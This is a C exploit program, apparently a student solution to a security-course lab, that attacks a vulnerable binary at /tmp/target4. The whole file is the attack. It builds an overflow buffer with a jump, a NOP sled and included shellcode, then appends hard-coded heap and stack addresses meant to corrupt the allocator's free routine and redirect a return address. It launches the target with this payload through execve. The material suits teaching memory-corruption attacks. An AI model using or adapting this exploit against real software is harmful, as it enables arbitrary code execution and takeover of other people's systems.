#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET; /*args[1] = "hi there"; args[2] = NULL;*/
  env[0] = NULL;

  char overflow_buf[512];
  int i;
    for (i = 0; i < 8; i++) {
    if (i == 0) { overflow_buf[i] = 0xeb; continue; }
    if (i == 1) { overflow_buf[i] = 0x10; continue; }  
    if (i == 2 || i == 3 || i == 4 || i == 5 || i == 6 || i == 7) { 
      overflow_buf[i] = 0xFF; continue; // THIS IS HERE SO TFREE() DOES NOT
     }					// OVERWRITE THE INTIAL BYTES OF SHELLCODE
   }  

  for (i=i; i < 250; i++) {  
    overflow_buf[i] = 0x90;
  } // NOPSLED
    // |
    // |
    // | SKKRRTT!
    // |
    // V
    // BOOM!
  for (i=i; i < 250 + strlen(shellcode); i++) {
    overflow_buf[i] = shellcode[i - 250];
  } // SHELLCODE

  for (i=i; i < 504; i++) {
    overflow_buf[i] = 0xFF;
  }
  

  // ADDRESS OF P's HEAPSPACE
  overflow_buf[504] = 0x48;
  overflow_buf[505] = 0x9a;
  overflow_buf[506] = 0x04;
  overflow_buf[507] = 0x08;

  // ADDRESS OF STACKFRAME CONTAINING RETURN ADDRESS 
  // IE FOO WILL RETURN HERE 
  overflow_buf[508] = 0x4c;
  overflow_buf[509] = 0xfc;
  overflow_buf[510] = 0xff;
  overflow_buf[511] = 0xbf; 

/*  
  printf("size of shellcode: %d\n", strlen(shellcode));
  int k;
  for (k = 0; k < sizeof(overflow_buf); k++) {
    printf("index %d: %hhx\n", k, overflow_buf[k]);
  } 
*/

  args[1] = overflow_buf;
  args[2] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
